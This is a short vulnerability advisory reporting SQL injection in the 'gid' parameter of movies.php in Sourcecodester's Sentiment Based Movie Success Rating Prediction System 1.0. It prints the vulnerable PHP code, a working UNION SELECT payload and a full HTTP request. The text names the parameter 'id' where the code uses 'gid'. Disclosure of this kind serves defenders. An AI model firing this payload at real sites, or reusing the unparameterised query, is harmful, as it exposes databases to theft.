# SQL Injection vulnerability was discovered in Sourcecodester's Sentiment Based Movie Success Rating Prediction System  (movies)

Official Website: https://www.sourcecodester.com/php/15104/sentiment-based-movie-rating-system-using-phpoop-free-source-code.html

Version: 1.0 Related Code file: /msrps/movies.php

dbname=msrps_db

Payload: /msrps/?page=movies&genre=Fantasy&gid=-13' union select 1,database(),3,4,5,6,7,8,9,10,11,12,13--+


<hr>

```php
<?php 
$title =isset($_GET['genre']) ? urldecode($_GET['genre'])." Movie List": "";
if(isset($_GET['search'])){
    $title = "Look for Movies that has '{$_GET['search']}' keyword...";
}
?>
<?php 
            $where ="";
            if(isset($_GET['gid'])){
                $where = " where CONCAT('|',REPLACE(`genres`,',','|,|'),'|') LIKE '%|{$_GET['gid']}|%' ";
            }
            if(isset($_GET['search'])){
                $s = $conn->real_escape_string($_GET['search']);
                $where = " where title LIKE '%{$s}%' OR  description  LIKE '%{$s}%' OR  actors LIKE '%{$s}%' OR  director LIKE '%{$s}%' OR writter LIKE '%{$s}%' OR  produced LIKE '%{$s}%' ";
            }
            $movie_query = $conn->query("SELECT * FROM `movie_list` {$where} order by `title` asc");
            while($row = $movie_query->fetch_assoc()):
            ?>
```
The id variable is directly inserted into the SQL query without any escaping or parameterization. An attacker could inject malicious SQL code by manipulating the id field. in (line number 1-24 of movies.php)

Injection parameter: id


```
GET /msrps/?page=movies&genre=Fantasy&gid=-13%27%20union%20select%201,database(),3,4,5,6,7,8,9,10,11,12,13--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=d875bcn74rhdbnpu2oo6knfokq
Connection: close
```

![image](https://github.com/user-attachments/assets/5fe59ba4-1f7c-4313-923b-d9d4aa817e9c)

